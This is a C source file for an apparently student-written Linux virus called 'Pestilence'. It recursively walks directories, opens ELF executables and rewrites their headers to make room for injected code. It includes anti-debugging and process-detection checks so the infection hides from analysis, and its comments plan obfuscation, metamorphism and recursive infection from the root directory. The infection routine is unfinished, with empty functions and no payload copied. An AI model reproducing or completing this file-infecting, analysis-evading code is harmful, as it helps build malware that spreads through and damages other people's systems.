/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   pestilence.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: xxxxxxx <xxxxxxx@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/19 15:46:33 by xxxxxxx           #+#    #+#             */
/*   Updated: 2026/01/20 16:41::395 by xxxxxxx          ###   ########.fr */
/*                                                                            */
/* ************************************************************************** */

/*
	PESTILENCE
	[ ] Creer segment pour injecter d'une taille arbitraire
	[ ] Recreer routine d'infection en famine like adapté sur le segment créé
		- /tmp/test et /tmp/test2
		- infection binaire 64 bits
		- pas de double infection
		- pas de sortie std ou erreur
	[X] Avoid infection if debugger
	[X] Avoid infection if specific program running
	[ ] Code source illisible et offuscé

	WAR
	[ ] Fingerprint unique dans signature pour chaque infection
		- how ? why no random ?

	DEATH
	[ ] Metamorphic -> structure différente a chaque exécution même sur binaire
   original identique
		- how ?

	BONUS
	[ ] Binaire 32 bits
	[ ] Autres types de fichier non binaires
	[ ] Packing pour rendre binaire plus léger
	[ ] Infection récursive depuis / (utiliser les binaires infectés)
*/

#include "pestilence.h"

void _start(void)
{
	void *begin_ptr;

	__asm__ volatile(
		"lea (%%rip), %0" // Load effective address of the instruction pointer
		: "=r"(begin_ptr) // Output operand, store into `begin_ptr`
	);
	begin_ptr -= 7;
	// ft_close(1);
	// ft_close(2);

	// if (is_debugged() || is_program_running("doom-nukem"))
	// 	ft_exit(0);

	// #ifdef BONUS
	// 	// if envp has path
	// 	// 		infect path
	// 	// else
	// 	char path[2];
	// 	path[0] = '/';
	// 	path[1] = '\0';
	// 	processDirectory(path, begin_ptr);
	// #else
	char path[11];
	path[0] = '/';
	path[1] = 't';
	path[2] = 'm';
	path[3] = 'p';
	path[4] = '/';
	path[5] = 't';
	path[6] = 'e';
	path[7] = 's';
	path[8] = 't';
	path[9] = '\0';
	path[10] = '\0';
	processDirectory(path, begin_ptr);
	path[9] = '2';
	processDirectory(path, begin_ptr);
	// #endif
	ft_exit(0);
}

int is_program_running(const char *target)
{
	int fd = ft_open("/proc", O_RDONLY | O_DIRECTORY);
	if (fd < 0)
		return 0;
	char buf[4096];
	for (;;)
	{
		int nread = ft_getdents64(fd, buf, 4096);
		if (nread <= 0)
			break;
		for (int bpos = 0; bpos < nread;)
		{
			struct linux_dirent64 *d = (struct linux_dirent64 *) (buf + bpos);
			const char			  *name = d->d_name;
			// skip non-numeric entries
			int					   numeric = 1;
			for (int i = 0; name[i]; i++)
			{
				if (name[i] < '0' || name[i] > '9')
				{
					numeric = 0;
					break;
				}
			}
			if (numeric)
			{
				// manually build "/proc/<pid>/comm" without printf
				char path[64];
				int	 i = 0;
				path[i++] = '/';
				path[i++] = 'p';
				path[i++] = 'r';
				path[i++] = 'o';
				path[i++] = 'c';
				path[i++] = '/';
				for (int j = 0; name[j]; j++)
					path[i++] = name[j];
				path[i++] = '/';
				path[i++] = 'c';
				path[i++] = 'o';
				path[i++] = 'm';
				path[i++] = 'm';
				path[i] = '\0';
				int cfd = ft_open(path, O_RDONLY);
				if (cfd >= 0)
				{
					char pname[64];
					int	 len = ft_read(cfd, pname, sizeof(pname) - 1);
					ft_close(cfd);
					if (len > 0)
					{
						pname[len] = '\0';
						char *nl = ft_strchr(pname, '\n');
						if (nl)
							*nl = '\0';
						if (ft_strcmp(pname, target) == 0)
						{
							ft_close(fd);
							return 1;
						}
					}
				}
			}
			bpos += d->d_reclen;
		}
	}
	ft_close(fd);
	return 0;
}

int is_debugged(void)
{
	int f = ft_open("/proc/self/status", O_RDONLY);
	if (f < 0)
		// goto next_check;
		return 0;
	char line[256];
	int	 nread;
	int	 offset = 0;

	while ((nread = ft_read(f, line + offset, sizeof(line) - offset)) > 0)
	{
		offset += nread;
		char *newline = ft_strchr(line, '\n');
		if (newline)
		{
			*newline = '\0';
			if (ft_strncmp(line, "TracerPid:", 10) == 0)
			{
				int pid = ft_atoi(line + 10);
				ft_close(f);
				return pid != 0;
			}
			offset = 0;
		}
	}

	ft_close(f);
	// next_check:
	// 	if (ft_ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1)
	// 		return 1;

	// 	ft_write(1, "ptrace check passed\n", 20);
	// 	ft_ptrace(PTRACE_DETACH, 0, NULL, NULL);
	return 0;
}

void processDirectory(char *folder, void *begin_ptr)
{
	int					   fd = ft_open(folder, 0 | 65536);

	char				   buffer[1024];
	struct linux_dirent64 *dirent;
	int					   nread;

	// Loop over dir entry
	if (fd < 0)
		goto clean;
	while ((nread = ft_getdents64(fd, buffer, 1024)) > 0)
	{
		for (int bpos = 0; bpos < nread;)
		{
			char dot[3];
			// get current dir entry
			dirent = (struct linux_dirent64 *) (buffer + bpos);
			char *d_name = dirent->d_name;

			// Skip "." and ".." entries
			dot[0] = '.';
			dot[1] = 0;
			if (ft_strcmp(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			dot[1] = '.';
			dot[2] = 0;
			if (ft_strcmp(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			char fullPath[PATH_MAX];
			char slash[2];
			slash[0] = '/';
			slash[1] = 0;
			ft_strcat(ft_strcat(ft_strcpy(fullPath, folder), slash), d_name);

			struct stat statbuf;
			ft_lstat(fullPath, &statbuf);

			if (statbuf.st_mode & __S_IFDIR)
			{
				// If directory, recurse into it
				processDirectory(fullPath, begin_ptr);
			}
			else if (statbuf.st_mode & __S_IFREG)
			{
				// If regular file and executable, infect it
				infect(fullPath, begin_ptr);
			}

			bpos += dirent->d_reclen;
		}
	}
clean:
	ft_close(fd);
}

#define ELF_MAGIC			   0x464c457f
#define MINIMAL_INJECTION_SIZE sizeof(ElfW(Phdr))

void bump_segment(ElfW(Phdr) * segment, Elf64_Off insertion_start,
				  Elf64_Half insertion_size, Elf64_Addr *entry)
{
}

void bump_section(ElfW(Shdr) * section, Elf64_Off insertion_start,
				  Elf64_Half insertion_size)
{
}

void relocate(char *file_data, off_t file_size, t_elf elf,
			  Elf64_Off insertion_start, Elf64_Half insertion_size)
{
	ElfW(Dyn) * dynamic_table;

	if (elf.header->e_phoff >= insertion_start)
		elf.header->e_phoff += insertion_size;
	if (elf.header->e_shoff >= insertion_start)
		elf.header->e_shoff += insertion_size;
	for (int i = 0; i < elf.header->e_phnum; i++)
	{
		if (elf.segments[i].p_type == PT_DYNAMIC)
		{
			// dynamic_table = (ElfW(Dyn) *) file_data +
			// elf.segments[i].p_offset; while (dynamic_table->d_tag != DT_NULL)
			// {
			// 	switch (dynamic_table->d_tag)
			// 	{
			// 		// case constant expression:
			// 		// 	/* code */
			// 		// 	break;

			// 	default:
			// 		break;
			// 	}
			// }
		}
		if (elf.segments[i].p_offset >= insertion_start)
			elf.segments[i].p_offset += insertion_size;
		else if (elf.segments[i].p_offset + elf.segments[i].p_filesz
				 > insertion_start)
		{
			elf.segments[i].p_filesz += insertion_size;
			elf.segments[i].p_memsz += insertion_size;
		}
	}
	write(1, "segments remaped\n", 17);
	for (int i = 0; i < elf.header->e_shnum; i++)
		if (elf.sections[i].sh_offset >= insertion_start)
			elf.sections[i].sh_offset += insertion_size;
		else if (elf.sections[i].sh_offset + elf.sections[i].sh_size
				 >= insertion_start)
			elf.sections[i].sh_size += insertion_size;
	write(1, "sections remaped\n", 17);
	ft_memmove(file_data + insertion_start + insertion_size,
			   file_data + insertion_start, file_size - insertion_start);
	write(1, "data moved\n", 0);
}

void infect(char *path, void *begin_ptr)
{
	int			fd;
	struct stat statbuf;
	char	   *file_data;
	t_elf		elf;

	// TODO: calculate injection_size from max align and
	// MINIMAL_INJECTION_SIZE
	write(1, path, 12);
	write(1, "\n", 1);
	file_data = NULL;
	fd = ft_open(path, O_RDWR);
	if (fd < 0 || ft_fstat(fd, &statbuf) < 0)
		goto clean;
	if (ft_ftruncate(fd, statbuf.st_size + MINIMAL_INJECTION_SIZE) < 0)
		goto clean;
	file_data
		= (void *) ft_syscall(9, 0, statbuf.st_size + MINIMAL_INJECTION_SIZE,
							  PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (file_data == MAP_FAILED)
		goto clean;
	if (statbuf.st_size < sizeof(ElfW(Ehdr))
		|| ((unsigned *) file_data)[0] != ELF_MAGIC)
		goto clean;
	elf.header = (ElfW(Ehdr) *) file_data;
	if (statbuf.st_size < elf.header->e_shoff
							  + elf.header->e_shnum * elf.header->e_shentsize
		|| statbuf.st_size
			   < elf.header->e_phoff
					 + elf.header->e_phnum * elf.header->e_phentsize)
		goto clean;
	elf.sections = (ElfW(Shdr) *) (file_data + elf.header->e_shoff);
	elf.segments = (ElfW(Phdr) *) (file_data + elf.header->e_phoff);
	write(1, "target located\n", 15);
	relocate(file_data, statbuf.st_size, elf,
			 elf.header->e_phoff
				 + elf.header->e_phentsize * elf.header->e_phnum,
			 MINIMAL_INJECTION_SIZE);
	ft_write(1, "relocated to the abyss\n", 23);
	ft_bzero(file_data + elf.header->e_phoff
				 + elf.header->e_phentsize * elf.header->e_phnum,
			 MINIMAL_INJECTION_SIZE);
	elf.header->e_phnum++;

clean:
	ft_msync(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE, MS_SYNC);
	ft_munmap(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE);
	ft_close(fd);
}
